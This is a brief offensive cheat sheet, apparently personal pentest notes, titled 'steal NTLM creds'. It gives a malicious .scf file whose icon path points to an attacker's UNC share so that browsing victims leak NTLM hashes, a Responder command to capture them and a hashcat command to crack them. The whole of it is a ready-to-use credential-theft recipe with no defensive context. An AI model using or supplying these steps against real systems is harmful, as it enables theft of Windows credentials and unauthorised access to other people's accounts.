# steal NTLM creds

## .scf file

```
[Shell]
Command=2
IconFile=\\IP\drive\kashz.ico
[Taskbar]
Command=ToggleDesktop

# use responder to capture hash
sudo responder -wrf --lm -v -I tun0

# crack: copy entire responder hash in file
hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
```
